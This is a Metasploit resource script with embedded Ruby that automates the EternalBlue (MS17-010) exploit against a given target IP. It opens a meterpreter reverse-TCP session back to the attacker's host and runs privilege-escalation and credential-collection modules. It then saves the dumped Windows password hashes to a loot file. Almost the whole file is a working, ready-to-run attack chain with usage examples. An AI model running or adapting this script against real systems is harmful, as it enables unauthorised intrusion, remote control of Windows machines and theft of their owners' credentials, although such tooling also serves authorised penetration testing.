spool /root/.msf4/logs/console.log
<ruby>

def help_me
    help = %Q|
 Description:
   This RC file can be used to exploit EternalBlue and dump password hashes.

   Usage:
   msfconsole -r [rc_path] [rhost] [lhost] [lport]

 Arguments:
   rc_path      - Full path to the RC script
   rhost        - Remote target IP Address
   lhost        - Local IP Address
   lport        - Port to open locally for callback

 Examples:
   Get the help screen:
     msfconsole -r eternal_blue.rc help
   Attempt to pwn 10.0.0.8 from 10.0.0.130 over port 4444:
     msfconsole -r eternal_blue.rc 10.0.0.8 10.0.0.130 4444

 Author:
   Jayson Grace (jayson.e.grace@gmail.com)
    |

    help = help.gsub(/^\t/, '')
    print_line(help)
end

# Not perfect, but it will do
def check_ip(target)
    if !(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/).match(target)
        raise ArgumentError, "Invalid IP address specified."
    end
end

def check_reqd_args(args)
    if args[:rhost] == nil
        raise ArgumentError, "Missing RHOST value, use the help parameter and follow the instructions"
    elsif args[:lhost] == nil
        raise ArgumentError, "Missing LHOST value, use the help parameter and follow the instructions"
    elsif args[:lport] == nil
        raise ArgumentError, "Missing LPORT value, use the help parameter and follow the instructions"
    end
end

def init_args
    args = {}
    if ARGV.join('') =~ /^help$/i
        args[:help] = true
        return args
    end

    args[:rhost] = ARGV.shift
    args[:lhost] = ARGV.shift
    args[:lport] = ARGV.shift

    check_reqd_args(args)

    check_ip(args[:rhost])
    check_ip(args[:lhost])

    print_good "RHOST: #{args[:rhost]}"
    print_good "LHOST: #{args[:lhost]}"
    print_good "LPORT: #{args[:lport]}"

    return args
end

$exploit = "use exploit/windows/smb/ms17_010_eternalblue"
$payload = "set PAYLOAD windows/x64/meterpreter/reverse_tcp"
$post_modules = ["use post/windows/escalate/getsystem", "use post/windows/gather/credentials/credential_collector"]
$cred_dump_file = "/root/.msf4/loot/windows_password_hashes.txt"

def run_post(post_module)
    tries = 10
    begin
        run_single post_module
        framework.sessions.each do |sid, s|
            print_status "Attempting to run #{post_module}"
            run_single "set SESSION #{sid}"
            run_single "run"
        end
    rescue Exception => e
        tries -= 1
        if tries > 0
            retry
        else
            print_error "Unable to run the post module due to this issue: #{e}"
        end
    end
end

def run_exploit
    tries = 10
    begin
        run_single $exploit
        run_single "set RHOST #{$remote_host}"
        run_single $payload
        run_single "set LHOST #{$local_host}"
        run_single "set LPORT #{$local_port}"
        run_single "set ExitOnSession false"
        run_single "exploit -j -z"
    rescue Exception => e
        tries -= 1
        if tries > 0
            retry
        else
            print_error("Unable to establish as session because: #{e}")
        end
    end
end

def creds_to_file
    File.readlines("/root/.msf4/logs/console.log").each do |line|
        if /^.*?+:\s(\w+:[a-z0-9]+:\w+)$/.match line
            # Append to loot_file
            File.open($cred_dump_file, "a") do |file|
                file << "#{$1}\n"
            end
        end
    end
    print_good("Hashes dumped to #{$cred_dump_file}")
end

def main
    args = init_args

    if args[:help]
        help_me
        run_single("exit")
        return
    end

    $remote_host = args[:rhost]
    $local_host = args[:lhost]
    $local_port = args[:lport]

    run_exploit

    # Wait for a session
    until not framework.sessions.empty?
        print_status "Waiting for session to be established..."
        sleep 10
    end

    # Exploits are really unpredictable, so extra checks are warranted
    if not framework.sessions.empty?
        print_good "Session established!"
        $post_modules.each do |post_module|
            run_post(post_module)
        end
        creds_to_file
    end
end

main
</ruby>
